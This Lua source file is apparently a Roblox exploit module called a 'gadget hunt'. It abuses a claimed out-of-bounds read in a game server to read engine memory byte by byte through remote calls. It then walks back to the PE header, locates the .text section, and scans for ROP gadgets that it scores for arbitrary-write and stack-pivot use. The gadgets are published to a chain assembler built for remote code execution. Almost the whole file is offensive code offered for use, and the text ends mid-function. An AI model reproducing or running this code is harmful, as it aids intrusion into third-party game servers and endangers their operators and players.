-- ══════════════════════════════════════════════════════════════════════════════
-- BRE_GADGET_HUNT — Binary .text Segment Gadget Scanner
-- PaperCuts RAE — Layer 4 BRCE
-- ══════════════════════════════════════════════════════════════════════════════
--
-- Uses the confirmed AAR (Arbitrary Address Read) OOB primitive to physically
-- walk the server engine's .text segment byte-by-byte, hunting for ROP gadgets.
--
-- Pipeline:
--   1. PE Header Hunt — walk backward from anchor in 4KB pages until MZ found
--   2. .text Locator  — parse PE Section Table to find .text VirtualAddress + Size
--   3. Byte Reader    — AAR OOB read via Naked Fire, multi-modal byte extraction
--   4. RET Scanner    — detect 0xC3 / 0xC2 / 0xCB in the byte stream
--   5. Backward Walk  — disassemble 1-8 instructions back from each RET
--   6. Filter         — discard sequences with forbidden instructions
--   7. Classifier     — categorize surviving gadgets by utility type
--   8. Export         — publish gadget table to _G.PC.BGH and BRE gadget pool
--
-- ══════════════════════════════════════════════════════════════════════════════

local BGH = {}
BGH.VERSION = "1.0.0"

-- ── State ─────────────────────────────────────────────────────────────────────
BGH.STATE = {
    IDLE        = "IDLE",
    PE_HUNT     = "PE_HUNT",       -- Walking back to find MZ header
    TEXT_LOCATE = "TEXT_LOCATE",   -- Parsing PE to find .text bounds
    SCANNING    = "SCANNING",      -- Walking .text byte by byte
    DONE        = "DONE",
    ERROR       = "ERROR",
}
BGH.CurrentState = BGH.STATE.IDLE

-- ── Configuration ─────────────────────────────────────────────────────────────
local CFG = {
    -- PE Hunt
    Anchor          = 0x7FF7684D1030, -- Known code address inside .text
    PageSize        = 0x1000,         -- 4KB — Windows page alignment
    MaxPEWalkPages  = 512,            -- Max pages to walk back (~2MB)

    -- Byte reader
    ReadTimeout     = 3.0,            -- Per-read fire timeout
    ReadRetries     = 3,              -- Retries per address
    ReadInterval    = 0.04,           -- Seconds between reads (25 reads/sec max)
    BatchSize       = 64,             -- Addresses per yield cycle

    -- Gadget depth
    MinDepth        = 5,              -- Min instructions back from RET
    MaxDepth        = 8,              -- Max instructions back from RET

    -- Scan bounds override (optional — set after .text located)
    TextBase        = nil,
    TextSize        = nil,
    MaxScanBytes    = 0x400000,       -- 4MB scan cap even if .text is larger
}

-- ── x86-64 Instruction Length Table ──────────────────────────────────────────
-- Single-byte opcodes with fixed lengths. Used for backward disassembly.
-- For variable-length instructions we use heuristic length estimation.
local FIXED_LEN = {
    [0x90]=1,  -- NOP
    [0xC3]=1,  -- RET
    [0xCB]=1,  -- FAR RET
    [0xC9]=1,  -- LEAVE
    [0xF4]=1,  -- HLT
    [0xCC]=1,  -- INT 3
    [0x50]=1,[0x51]=1,[0x52]=1,[0x53]=1,  -- PUSH reg
    [0x54]=1,[0x55]=1,[0x56]=1,[0x57]=1,
    [0x58]=1,[0x59]=1,[0x5A]=1,[0x5B]=1,  -- POP reg
    [0x5C]=1,[0x5D]=1,[0x5E]=1,[0x5F]=1,
    [0x40]=1,[0x41]=1,[0x42]=1,[0x43]=1,  -- INC/DEC (legacy)
    [0x44]=1,[0x45]=1,[0x46]=1,[0x47]=1,
    [0x48]=1,[0x49]=1,[0x4A]=1,[0x4B]=1,
    [0x4C]=1,[0x4D]=1,[0x4E]=1,[0x4F]=1,
    [0x98]=1,  -- CBW/CWDE/CDQE
    [0x99]=1,  -- CWD/CDQ/CQO
    [0xC0]=2,  -- ROL/ROR/etc r/m8, imm8
    [0xC1]=2,  -- ROL/ROR/etc r/m, imm8 (partial)
    [0xEB]=2,  -- JMP short rel8
    [0x70]=2,[0x71]=2,[0x72]=2,[0x73]=2,  -- Jcc rel8
    [0x74]=2,[0x75]=2,[0x76]=2,[0x77]=2,
    [0x78]=2,[0x79]=2,[0x7A]=2,[0x7B]=2,
    [0x7C]=2,[0x7D]=2,[0x7E]=2,[0x7F]=2,
    [0xC2]=3,  -- RET imm16
    [0xCA]=3,  -- FAR RET imm16
    [0xE8]=5,  -- CALL rel32
    [0xE9]=5,  -- JMP rel32
    [0x68]=5,  -- PUSH imm32
    [0xB8]=5,[0xB9]=5,[0xBA]=5,[0xBB]=5,  -- MOV reg, imm32 (partial)
    [0xBC]=5,[0xBD]=5,[0xBE]=5,[0xBF]=5,
}

-- ── Forbidden instruction opcodes ─────────────────────────────────────────────
-- Any gadget sequence containing these is discarded.
local FORBIDDEN = {
    [0xC3] = "nested RET",    -- would redirect EIP early
    [0xCB] = "far RET",
    [0xC2] = "RET imm16",     -- nested variant
    [0xCA] = "far RET imm16",
    [0xCD] = "INT n",         -- kernel transition
    [0xCC] = "INT 3",         -- breakpoint trap
    [0xF4] = "HLT",           -- halt
    -- 0x0F prefix — checked separately for SYSCALL(0x05) SYSENTER(0x34)
}

-- ── RET opcodes (valid chain terminators) ──────────────────────────────────────
local RET_OPCODES = {
    [0xC3] = true,   -- near RET
    [0xC2] = true,   -- near RET imm16
}

-- ── Gadget type classifier ─────────────────────────────────────────────────────
-- Maps leading opcode to gadget utility class.
local GADGET_CLASSES = {
    -- Memory primitives (highest value for AAW)
    [0x89] = "MOV_MEM_WRITE",   -- MOV [r/m], reg
    [0x8B] = "MOV_MEM_READ",    -- MOV reg, [r/m]
    [0x88] = "MOV_BYTE_WRITE",  -- MOV [r/m8], reg8
    [0x8A] = "MOV_BYTE_READ",   -- MOV reg8, [r/m8]
    -- Stack pivots
    [0x5C] = "POP_RSP",         -- POP RSP
    [0x5D] = "POP_RBP",
    [0x5B] = "POP_RBX",
    [0x5F] = "POP_RDI",
    [0x5E] = "POP_RSI",
    [0x58] = "POP_RAX",
    [0x59] = "POP_RCX",
    [0x5A] = "POP_RDX",
    -- Dispatch (call through register — chain pivot)
    [0xFF] = "CALL_REG",        -- CALL r/m64 (needs modrm check)
    -- Arithmetic (for address computation)
    [0x01] = "ADD_MEM",
    [0x03] = "ADD_REG",
    [0x29] = "SUB_MEM",
    [0x2B] = "SUB_REG",
    [0x31] = "XOR_MEM",
    [0x33] = "XOR_REG",
    [0x21] = "AND_MEM",
    [0x23] = "AND_REG",
    -- Address computation
    [0x8D] = "LEA",
    -- Exchange
    [0x87] = "XCHG",
    -- Move with sign/zero extend
    [0x0F] = "EXTENDED",        -- 0x0F prefix — need second byte
}

-- ── State storage ─────────────────────────────────────────────────────────────
BGH.PEBase      = nil       -- Found MZ base address
BGH.TextBase    = nil       -- .text segment start VA
BGH.TextSize    = nil       -- .text segment size
BGH.Gadgets     = {}        -- All confirmed gadgets
BGH.ByteCache   = {}        -- address → byte (avoid re-reading)
BGH.Stats       = {
    pagesWalked     = 0,
    bytesRead       = 0,
    retFound        = 0,
    sequencesChecked= 0,
    forbidden       = 0,
    confirmed       = 0,
    readErrors      = 0,
    cacheHits       = 0,
}

-- ── Callbacks ─────────────────────────────────────────────────────────────────
BGH.OnStateChange   = nil   -- (newState, oldState)
BGH.OnByteRead      = nil   -- (address, byte)
BGH.OnGadget        = nil   -- (gadget)
BGH.OnProgress      = nil   -- (bytesRead, totalBytes, gadgetsFound)
BGH.OnDone          = nil   -- (gadgets)
BGH.OnLog           = nil   -- (level, msg)

-- ── Helpers ───────────────────────────────────────────────────────────────────
local function setState(s)
    local old = BGH.CurrentState
    BGH.CurrentState = s
    if BGH.OnStateChange then pcall(BGH.OnStateChange, s, old) end
end

local function log(level, msg)
    if BGH.OnLog then pcall(BGH.OnLog, level, msg) end
    print(string.format("[BGH][%s] %s", level, msg))
end

local function getSink()
    local ASE = _G.PC and _G.PC.ASE
    if not ASE then return nil, nil end
    local stats = ASE.GetStats and ASE.GetStats()
    if not stats or not stats.HeartbeatAlive then return nil, nil end
    return stats.ActiveSink, nil
end

local function getRemoteInst(sinkRemote)
    -- Reuse BRE's resolveRemoteInstance if available
    local BRE = _G.PC and _G.PC.BRE
    if BRE and BRE._resolveRemote then
        return BRE._resolveRemote(sinkRemote)
    end

    -- Fallback: STS → RSM → DataModel walk
    local STS = _G.PC and _G.PC.STS
    if STS and STS.Report and STS.Report.remoteIndex then
        for _, entry in ipairs(STS.Report.remoteIndex) do
            if entry.name == sinkRemote and entry.path then
                local ok, inst = pcall(function()
                    local parts = {}
                    for part in (entry.path .. "."):gmatch("([^.]+)%.") do
                        table.insert(parts, part)
                    end
                    local cur = game
                    for _, part in ipairs(parts) do
                        local child = cur:FindFirstChild(part)
                        if child then
                            cur = child
                        else
                            local sok, svc = pcall(function()
                                return game:GetService(part)
                            end)
                            if sok and svc then cur = svc end
                        end
                        if not cur then return nil end
                    end
                    return cur
                end)
                if ok and inst and
                   (inst:IsA("RemoteEvent") or inst:IsA("RemoteFunction")) then
                    return inst
                end
            end
        end
    end

    -- DataModel brute walk
    for _, svcName in ipairs({"ReplicatedStorage","ReplicatedFirst","Workspace","Players"}) do
        local ok, svc = pcall(function() return game:GetService(svcName) end)
        if ok and svc then
            local inst = svc:FindFirstChild(sinkRemote, true)
            if inst and (inst:IsA("RemoteEvent") or inst:IsA("RemoteFunction")) then
                return inst
            end
        end
    end
    return nil
end

-- ── AAR Byte Reader ───────────────────────────────────────────────────────────
-- Core primitive: reads one byte at a target memory address using the OOB
-- reflection vulnerability. Address is formatted as the "index" in a naked
-- payload. The response is parsed through four extraction paths.

local function formatAARPayload(address)
    -- The OOB read treats our value as an array index into an internal table.
    -- We send the address as multiple candidate field types to maximize
    -- the chance the deserializer uses it as the index.
    return {
        __bre_aar   = true,
        __bre_addr  = address,
        index       = address,
        id          = address,
        userId      = address,
        objectId    = address,
        settingId   = address,
        n           = address,
    }
end

local function extractByte(response, errStr, latency, baseline)
    -- Path A: Clean table response with numeric field
    if type(response) == "table" then
        -- Look for any numeric value in 0-255 range
        for _, v in pairs(response) do
            if type(v) == "number" and v >= 0 and v <= 255 and
               math.floor(v) == v then
                return math.floor(v), "TABLE_DIRECT"
            end
        end
        -- Check for nested numeric
        for _, v in pairs(response) do
            if type(v) == "table" then
                for _, vv in pairs(v) do
                    if type(vv) == "number" and vv >= 0 and vv <= 255 and
                       math.floor(vv) == vv then
                        return math.floor(vv), "TABLE_NESTED"
                    end
                end
            end
        end
    end

    -- Path B: Numeric response directly
    if type(response) == "number" and response >= 0 and response <= 255 then
        return math.floor(response), "NUMERIC_DIRECT"
    end

    -- Path C: Error string contains hex or decimal value
    if type(errStr) == "string" and #errStr > 0 then
        -- Hex pattern: 0x?? or value 0x??
        local hexByte = errStr:match("0x(%x%x)%f[^%x]")
        if hexByte then
            return tonumber(hexByte, 16), "ERROR_HEX"
        end
        -- Decimal in error: "invalid index 195"
        local decByte = errStr:match("invalid.-%s(%d+)")
                     or errStr:match("index%s+(%d+)")
                     or errStr:match("value%s+(%d+)")
        if decByte then
            local n = tonumber(decByte)
            if n and n >= 0 and n <= 255 then
                return n, "ERROR_DECIMAL"
            end
        end
        -- String response containing a byte-range number
        local anyNum = errStr:match("%s(%d%d?%d?)%s")
        if anyNum then
            local n = tonumber(anyNum)
            if n and n >= 0 and n <= 255 then
                return n, "ERROR_EMBEDDED"
            end
        end
    end

    -- Path D: String response (error string passed as response itself)
    if type(response) == "string" then
        local hexByte = response:match("0x(%x%x)%f[^%x]")
        if hexByte then return tonumber(hexByte, 16), "RESP_HEX" end
        local n = tonumber(response:match("^%s*(%d+)%s*$"))
        if n and n >= 0 and n <= 255 then return n, "RESP_NUMERIC" end
    end

    -- Path E: Latency skew (coarse — last resort, only when baseline is reliable)
    -- Only engage this path if avgLatency is substantial enough to be meaningful.
    -- A near-zero baseline (RemoteEvent fire-and-forget) makes all ratios
    -- meaningless — skip entirely to avoid flooding with false 0xFF reads.
    if baseline and baseline.avgLatency and baseline.avgLatency >= 0.005 then
        local ratio = latency / baseline.avgLatency
        if ratio < 0.25 then
            return 0x00, "LATENCY_NULL"
        end
        -- Raise the spike threshold: only call it a boundary if latency is
        -- truly anomalous (> 8x baseline), not just slightly elevated.
        if ratio > 8.0 then
            return 0xFF, "LATENCY_BOUNDARY"
        end
    end

    return nil, "UNEXTRACTABLE"
end

local function readByte(remoteInst, address, baseline)
    -- Cache check
    if BGH.ByteCache[address] then
        BGH.Stats.cacheHits = BGH.Stats.cacheHits + 1
        return BGH.ByteCache[address], "CACHE"
    end

    local payload = formatAARPayload(address)
    local byte, source

    for attempt = 1, CFG.ReadRetries do
        local t0 = os.clock()
        local fireOk, fireResult = pcall(function()
            if remoteInst:IsA("RemoteFunction") then
                return remoteInst:InvokeServer(payload)
            else
                remoteInst:FireServer(payload)
                return nil
            end
        end)
        local latency = os.clock() - t0

        local errStr = not fireOk and tostring(fireResult) or nil
        local result = fireOk and fireResult or nil

        byte, source = extractByte(result, errStr, latency, baseline)

        if byte then
            BGH.Stats.bytesRead = BGH.Stats.bytesRead + 1
            BGH.ByteCache[address] = byte
            if BGH.OnByteRead then
                pcall(BGH.OnByteRead, address, byte)
            end
            return byte, source
        end

        if attempt < CFG.ReadRetries then
            task.wait(0.02)
        end
    end

    BGH.Stats.readErrors = BGH.Stats.readErrors + 1
    return nil, "FAILED"
end

-- ── Instruction length estimator ──────────────────────────────────────────────
-- Used during backward walk to estimate how far back to step.
-- Returns estimated byte length of instruction starting at given bytes.
local function estimateInstrLen(byte0, byte1)
    -- Check fixed-length table first
    if FIXED_LEN[byte0] then
        return FIXED_LEN[byte0]
    end

    -- REX prefix (0x40-0x4F) — add 1 and look at next byte
    if byte0 >= 0x40 and byte0 <= 0x4F then
        return 1 + (FIXED_LEN[byte1] or 3)
    end

    -- 0x0F escape — 2+ bytes
    if byte0 == 0x0F then
        return 2
    end

    -- ModRM-based instructions — rough estimate
    -- Most common forms: opcode + ModRM = 2 bytes, + SIB + disp = 2-6 bytes
    -- We conservatively use 3 as default
    return 3
end

-- ── Forbidden sequence checker ─────────────────────────────────────────────────
local function hasForbidden(bytes)
    local i = 1
    while i <= #bytes do
        local b = bytes[i]

        -- Skip the final byte if it's the terminating RET
        if i == #bytes and (b == 0xC3 or b == 0xC2) then
            break
        end

        -- Check forbidden table
        if FORBIDDEN[b] then
            return true, FORBIDDEN[b]
        end

        -- 0x0F prefix: check second byte
        if b == 0x0F and i + 1 <= #bytes then
            local b2 = bytes[i+1]
            if b2 == 0x05 then return true, "SYSCALL" end
            if b2 == 0x34 then return true, "SYSENTER" end
            if b2 == 0x0B then return true, "UD2" end
        end

        i = i + 1
    end
    return false, nil
end

-- ── Gadget classifier ──────────────────────────────────────────────────────────
local function classifyGadget(bytes)
    if #bytes == 0 then return "UNKNOWN", 0.5 end

    local lead = bytes[1]
    local cls = GADGET_CLASSES[lead]

    if not cls then
        -- REX prefix — look at next byte
        if lead >= 0x40 and lead <= 0x4F and bytes[2] then
            cls = GADGET_CLASSES[bytes[2]]
            if cls then cls = "REX_" .. cls end
        end
    end

    if not cls then cls = "GENERIC" end

    -- Score by utility
    local score = 0.5
    if cls == "MOV_MEM_WRITE" or cls == "MOV_BYTE_WRITE" then score = 0.95 end  -- AAW gadget
    if cls == "MOV_MEM_READ"  or cls == "MOV_BYTE_READ"  then score = 0.90 end  -- AAR gadget
    if cls == "CALL_REG"   then score = 0.88 end   -- dispatch pivot
    if cls == "LEA"        then score = 0.82 end   -- address computation
    if cls:find("POP_R")   then score = 0.78 end   -- stack pivot
    if cls:find("XOR")     then score = 0.65 end   -- register clear
    if cls:find("ADD") or cls:find("SUB") then score = 0.60 end
    if cls == "EXTENDED"   then score = 0.55 end
    if cls == "GENERIC"    then score = 0.45 end

    return cls, score
end

-- ── Backward disassembler ─────────────────────────────────────────────────────
-- Given a RET at `retAddr`, walk backward up to MaxDepth instructions.
-- Reads bytes via AAR primitive. Returns sequence bytes if valid gadget.

local function backwardWalk(remoteInst, retAddr, baseline)
    local sequences = {}

    -- Try each depth from MinDepth to MaxDepth
    for depth = CFG.MinDepth, CFG.MaxDepth do
        -- Estimate start address: assume average 3 bytes/instruction
        -- Try multiple start offsets to handle variable-length uncertainty
        local estimates = {}
        for offset = depth * 2, depth * 5 do
            table.insert(estimates, retAddr - offset)
        end

        for _, startAddr in ipairs(estimates) do
            if startAddr < (BGH.TextBase or 0) then continue end

            -- Read bytes from startAddr to retAddr (inclusive)
            local byteCount = retAddr - startAddr + 1
            if byteCount < 2 or byteCount > 32 then continue end

            local bytes = {}
            local allRead = true
            for addr = startAddr, retAddr do
                local b = readByte(remoteInst, addr, baseline)
                if b == nil then
                    allRead = false
                    break
                end
                table.insert(bytes, b)
                task.wait(CFG.ReadInterval)
            end

            if not allRead then continue end

            -- Check forbidden instructions
            local forbidden, reason = hasForbidden(bytes)
            if forbidden then
                BGH.Stats.forbidden = BGH.Stats.forbidden + 1
                continue
            end

            -- Classify
            local cls, score = classifyGadget(bytes)

            -- Build hex representation
            local hexParts = {}
            for _, b in ipairs(bytes) do
                table.insert(hexParts, string.format("%02X", b))
            end
            local hexStr = table.concat(hexParts, " ")

            table.insert(sequences, {
                startAddr = startAddr,
                retAddr   = retAddr,
                bytes     = bytes,
                byteCount = #bytes,
                hex       = hexStr,
                depth     = depth,
                class     = cls,
                score     = score,
            })

            BGH.Stats.sequencesChecked = BGH.Stats.sequencesChecked + 1
        end
    end

    -- Return best sequence (highest score)
    if #sequences == 0 then return nil end
    table.sort(sequences, function(a,b) return a.score > b.score end)
    return sequences[1]
end

-- ── Phase 1: PE Header Hunt ───────────────────────────────────────────────────
-- Walk backward from anchor in 4KB increments looking for MZ signature (0x4D 0x5A)

function BGH.FindPEBase(remoteInst, baseline)
    setState(BGH.STATE.PE_HUNT)
    log("INFO", string.format(
        "PE Header Hunt — anchor: 0x%X  pageSize: 0x%X",
        CFG.Anchor, CFG.PageSize))

    -- Align anchor down to nearest page boundary
    local startPage = CFG.Anchor - (CFG.Anchor % CFG.PageSize)

    for i = 0, CFG.MaxPEWalkPages do
        local pageBase = startPage - (i * CFG.PageSize)
        BGH.Stats.pagesWalked = BGH.Stats.pagesWalked + 1

        -- Read first two bytes of this page
        local b0 = readByte(remoteInst, pageBase, baseline)
        local b1 = readByte(remoteInst, pageBase + 1, baseline)

        task.wait(CFG.ReadInterval)

        if b0 == 0x4D and b1 == 0x5A then
            -- MZ signature found
            BGH.PEBase = pageBase
            log("INFO", string.format(
                "MZ signature found at 0x%X  (walked %d pages / %.2f KB)",
                pageBase, i, i * 4))
            return pageBase
        end

        if i % 32 == 0 and i > 0 then
            log("INFO", string.format(
                "PE hunt: page %d/%d  addr=0x%X",
                i, CFG.MaxPEWalkPages, pageBase))
        end
    end

    log("ERROR", "MZ signature not found within scan range")
    return nil
end

-- ── Phase 2: .text Section Locator ───────────────────────────────────────────
-- Parse PE header to find .text VirtualAddress and SizeOfRawData

function BGH.LocateTextSection(remoteInst, peBase, baseline)
    setState(BGH.STATE.TEXT_LOCATE)
    log("INFO", string.format("Locating .text section from PE base 0x%X", peBase))

    -- Read PE signature offset at Base+0x3C (e_lfanew field)
    -- This is a 4-byte little-endian value
    local b0 = readByte(remoteInst, peBase + 0x3C, baseline)
    local b1 = readByte(remoteInst, peBase + 0x3D, baseline)
    local b2 = readByte(remoteInst, peBase + 0x3E, baseline)
    local b3 = readByte(remoteInst, peBase + 0x3F, baseline)

    task.wait(CFG.ReadInterval * 2)

    if not (b0 and b1 and b2 and b3) then
        log("ERROR", "Failed to read e_lfanew")
        return nil, nil
    end

    local lfanew = b0 + (b1 * 0x100) + (b2 * 0x10000) + (b3 * 0x1000000)
    local peHeader = peBase + lfanew

    log("INFO", string.format("PE header at 0x%X  (e_lfanew=0x%X)", peHeader, lfanew))

    -- Verify PE signature: "PE\0\0" = 0x50 0x45 0x00 0x00
    local pe0 = readByte(remoteInst, peHeader, baseline)
    local pe1 = readByte(remoteInst, peHeader + 1, baseline)
    task.wait(CFG.ReadInterval)

    if pe0 ~= 0x50 or pe1 ~= 0x45 then
        log("WARN", string.format(
            "PE signature mismatch: got 0x%02X 0x%02X (expected 0x50 0x45)",
            pe0 or 0, pe1 or 0))
        -- Continue anyway — signature read may be imprecise through OOB
    end

    -- COFF header: NumberOfSections at PE+0x06
    local ns0 = readByte(remoteInst, peHeader + 0x06, baseline)
    local ns1 = readByte(remoteInst, peHeader + 0x07, baseline)
    task.wait(CFG.ReadInterval)

    local numSections = (ns0 or 0) + ((ns1 or 0) * 0x100)
    log("INFO", string.format("Number of sections: %d", numSections))

    -- SizeOfOptionalHeader at PE+0x14
    local oh0 = readByte(remoteInst, peHeader + 0x14, baseline)
    local oh1 = readByte(remoteInst, peHeader + 0x15, baseline)
    task.wait(CFG.ReadInterval)

    local optHeaderSize = (oh0 or 0) + ((oh1 or 0) * 0x100)
    log("INFO", string.format("Optional header size: 0x%X", optHeaderSize))

    -- Section table starts at: PE header + 0x18 (COFF header size) + optHeaderSize
    local sectionTable = peHeader + 0x18 + optHeaderSize

    -- Each section header is 40 bytes (IMAGE_SECTION_HEADER)
    -- Layout: Name(8) + VirtualSize(4) + VirtualAddress(4) + SizeOfRawData(4) + ...
    -- We look for the section named ".text"

    local textVA   = nil
    local textSize = nil

    for i = 0, math.min(numSections - 1, 24) do
        local sBase = sectionTable + (i * 40)

        -- Read 8-byte section name
        local nameBytes = {}
        for j = 0, 7 do
            local b = readByte(remoteInst, sBase + j, baseline)
            if b and b > 0 then
                table.insert(nameBytes, string.char(b))
            end
            task.wait(CFG.ReadInterval * 0.5)
        end
        local name = table.concat(nameBytes)

        -- Read VirtualAddress (4 bytes LE) at offset +12
        local va0 = readByte(remoteInst, sBase + 12, baseline)
        local va1 = readByte(remoteInst, sBase + 13, baseline)
        local va2 = readByte(remoteInst, sBase + 14, baseline)
        local va3 = readByte(remoteInst, sBase + 15, baseline)

        -- Read SizeOfRawData (4 bytes LE) at offset +16
        local sz0 = readByte(remoteInst, sBase + 16, baseline)
        local sz1 = readByte(remoteInst, sBase + 17, baseline)
        local sz2 = readByte(remoteInst, sBase + 18, baseline)
        local sz3 = readByte(remoteInst, sBase + 19, baseline)

        task.wait(CFG.ReadInterval)

        local va = (va0 or 0) + ((va1 or 0) * 0x100) +
                   ((va2 or 0) * 0x10000) + ((va3 or 0) * 0x1000000)
        local sz = (sz0 or 0) + ((sz1 or 0) * 0x100) +
                   ((sz2 or 0) * 0x10000) + ((sz3 or 0) * 0x1000000)

        log("INFO", string.format(
            "Section[%d]: '%s'  VA=0x%X  Size=0x%X",
            i, name, va, sz))

        -- Match .text (may appear as ".text" or "text" or just start with ".")
        if name:sub(1,5) == ".text" or name:sub(1,4) == "text" then
            textVA   = peBase + va
            textSize = sz
            log("INFO", string.format(
                ".text found: base=0x%X  size=0x%X  end=0x%X",
                textVA, textSize, textVA + textSize))
            break
        end
    end

    if not textVA then
        -- Fallback: use anchor address and scan from a safe estimate
        log("WARN", ".text section not found in PE table — using anchor heuristic")
        -- The anchor is known to be in .text. Estimate: scan ±4MB from anchor.
        textVA   = CFG.Anchor - 0x200000
        textSize = 0x400000
        log("WARN", string.format(
            "Heuristic .text: base=0x%X  size=0x%X", textVA, textSize))
    end

    BGH.TextBase = textVA
    BGH.TextSize = textSize
    return textVA, textSize
end

-- ── Baseline recorder ─────────────────────────────────────────────────────────
local function recordGHBaseline(remoteInst, sinkRemote)
    log("INFO", "Recording read baseline...")
    local baseline = {
        avgLatency  = 0,
        errorRate   = 0,
        samples     = {},
    }
    local total = 0
    local errors = 0
    local SAMPLES = 6

    for i = 1, SAMPLES do
        local t0 = os.clock()
        local ok = pcall(function()
            if remoteInst:IsA("RemoteFunction") then
                remoteInst:InvokeServer({ __bre_baseline=true, index=i })
            else
                remoteInst:FireServer({ __bre_baseline=true, index=i })
            end
        end)
        local lat = math.max(os.clock() - t0, 0.001)  -- 1ms floor: RemoteEvent
        total = total + lat                             -- fire-and-forget measures
        if not ok then errors = errors + 1 end          -- near-zero locally
        task.wait(0.08)
    end

    baseline.avgLatency = total / SAMPLES
    baseline.errorRate  = errors / SAMPLES
    log("INFO", string.format(
        "Baseline: avgLatency=%.4fs  errorRate=%.0f%%",
        baseline.avgLatency, baseline.errorRate * 100))
    return baseline
end

-- ── Phase 3 + 4 + 5 + 6 + 7: Main Scan Loop ──────────────────────────────────
-- Walk .text segment byte by byte. On each 0xC3/0xC2, run backward walk.

function BGH.ScanTextSegment(remoteInst, baseline)
    setState(BGH.STATE.SCANNING)

    local scanBase = BGH.TextBase
    local scanSize = math.min(BGH.TextSize or CFG.MaxScanBytes, CFG.MaxScanBytes)
    local scanEnd  = scanBase + scanSize

    log("INFO", string.format(
        "Scanning .text: 0x%X → 0x%X  (%.2f MB)",
        scanBase, scanEnd, scanSize / 1048576))

    local addr    = scanBase
    local batchN  = 0

    while addr < scanEnd do
        if BGH.CurrentState ~= BGH.STATE.SCANNING then
            log("INFO", "Scan aborted — state changed")
            break
        end

        local byte, source = readByte(remoteInst, addr, baseline)
        batchN = batchN + 1

        if byte then
            -- Check for RET opcodes
            if RET_OPCODES[byte] then
                BGH.Stats.retFound = BGH.Stats.retFound + 1

                log("INFO", string.format(
                    "RET [0x%02X] at 0x%X  (ret #%d)",
                    byte, addr, BGH.Stats.retFound))

                -- Run backward walk
                local seq = backwardWalk(remoteInst, addr, baseline)
                if seq then
                    BGH.Stats.confirmed = BGH.Stats.confirmed + 1

                    local gadget = {
                        id        = "BGH_" .. BGH.Stats.confirmed,
                        address   = seq.startAddr,
                        retAddr   = seq.retAddr,
                        bytes     = seq.bytes,
                        byteCount = seq.byteCount,
                        hex       = seq.hex,
                        depth     = seq.depth,
                        class     = seq.class,
                        score     = seq.score,
                        source    = "BINARY_.TEXT",
                        readSource= source,
                        foundAt   = os.clock(),
                    }

                    table.insert(BGH.Gadgets, gadget)

                    log("GADGET", string.format(
                        "[%s] %s  @0x%X  score=%.2f  bytes=%d  hex=[%s]",
                        gadget.id, gadget.class, gadget.address,
                        gadget.score, gadget.byteCount, gadget.hex))

                    if BGH.OnGadget then
                        pcall(BGH.OnGadget, gadget)
                    end

                    -- Publish to BRE gadget pool for chain assembler
                    local BRE = _G.PC and _G.PC.BRE
                    if BRE and BRE.Gadgets then
                        table.insert(BRE.Gadgets, {
                            id           = gadget.id,
                            patternId    = gadget.class,
                            patternLabel = gadget.class .. " @ 0x" ..
                                           string.format("%X", gadget.address),
                            desc         = gadget.hex,
                            score        = gadget.score,
                            source       = "BINARY",
                            address      = gadget.address,
                            hex          = gadget.hex,
                            bytes        = gadget.bytes,
                        })
                    end
                end
            end
        end

        -- Progress callback every 256 bytes
        if batchN % 256 == 0 then
            local pct = (addr - scanBase) / scanSize * 100
            if BGH.OnProgress then
                pcall(BGH.OnProgress,
                    addr - scanBase, scanSize, #BGH.Gadgets)
            end
            log("INFO", string.format(
                "Scan: %.1f%%  addr=0x%X  bytes=%d  gadgets=%d  errors=%d",
                pct, addr, BGH.Stats.bytesRead, #BGH.Gadgets,
                BGH.Stats.readErrors))
        end

        addr = addr + 1

        -- Yield every batch to avoid timeout
        if batchN % CFG.BatchSize == 0 then
            task.wait(0)
        end
    end

    -- Sort gadgets by score
    table.sort(BGH.Gadgets, function(a,b) return a.score > b.score end)

    setState(BGH.STATE.DONE)
    log("INFO", string.format(
        "Scan complete — %d bytes read  %d RETs found  %d gadgets confirmed  %d errors",
        BGH.Stats.bytesRead, BGH.Stats.retFound,
        BGH.Stats.confirmed, BGH.Stats.readErrors))

    if BGH.OnDone then
        pcall(BGH.OnDone, BGH.Gadgets)
    end
end

-- ── Full Run ──────────────────────────────────────────────────────────────────
function BGH.Run()
    if BGH.CurrentState ~= BGH.STATE.IDLE and
       BGH.CurrentState ~= BGH.STATE.ERROR and
       BGH.CurrentState ~= BGH.STATE.DONE then
        return false, "BGH already running (state: " .. BGH.CurrentState .. ")"
    end

    local ASE = _G.PC and _G.PC.ASE
    if not ASE then return false, "ASE not loaded" end
    local stats = ASE.GetStats and ASE.GetStats()
    if not stats or not stats.HeartbeatAlive then
        return false, "No active Bedrock sink — confirm handshake first"
    end

    local sinkRemote = stats.ActiveSink
    local remoteInst = getRemoteInst(sinkRemote)
    if not remoteInst then
        return false, "Could not resolve remote instance for: " .. tostring(sinkRemote)
    end

    -- Reset
    BGH.Gadgets    = {}
    BGH.ByteCache  = {}
    BGH.PEBase     = nil
    BGH.TextBase   = CFG.TextBase
    BGH.TextSize   = CFG.TextSize
    BGH.Stats      = {
        pagesWalked=0, bytesRead=0, retFound=0,
        sequencesChecked=0, forbidden=0, confirmed=0,
        readErrors=0, cacheHits=0,
    }

    -- ── Dynamic anchor resolution ──────────────────────────────────────────────
    -- Prefer an anchor derived from BRE's confirmed read primitives over
    -- the hardcoded CFG.Anchor. A primitive's triggerPayload.__bre_addr is
    -- a live code address that was inside the deserializer — a reliable .text
    -- landmark. Fall back to CFG.Anchor if no primitives are available.
    do
        local BRE = _G.PC and _G.PC.BRE
        if BRE and BRE.Primitives and #BRE.Primitives > 0 then
            -- Pick the highest-confidence read primitive
            local bestPrim = nil
            for _, p in ipairs(BRE.Primitives) do
                if p.hasRead and p.triggerPayload then
                    if not bestPrim or p.confidence > bestPrim.confidence then
                        bestPrim = p
                    end
                end
            end
            if bestPrim and bestPrim.triggerPayload then
                -- Extract the address field that produced the anomaly
                local addr = bestPrim.triggerPayload.__bre_addr
                    or bestPrim.triggerPayload.index
                    or bestPrim.triggerPayload.id
                if type(addr) == "number" and addr > 0x7FF000000000 then
                    -- Sanity: must look like a Windows user-space 64-bit address
                    if addr ~= CFG.Anchor then
                        log("INFO", string.format(
                            "Anchor updated from BRE primitive %s: 0x%X → 0x%X",
                            bestPrim.id, CFG.Anchor, addr))
                        CFG.Anchor = addr
                    end
                end
            end
        elseif BRE and BRE.CurrentState == BRE.STATE.ACTIVE then
            -- Bedrock is ACTIVE but no typed primitives yet —
            -- use the confirmed sink remote's probe anomaly address if recorded
            local probeLog = BRE.ProbeLog
            if probeLog and #probeLog > 0 then
                for i = #probeLog, 1, -1 do
                    local p = probeLog[i]
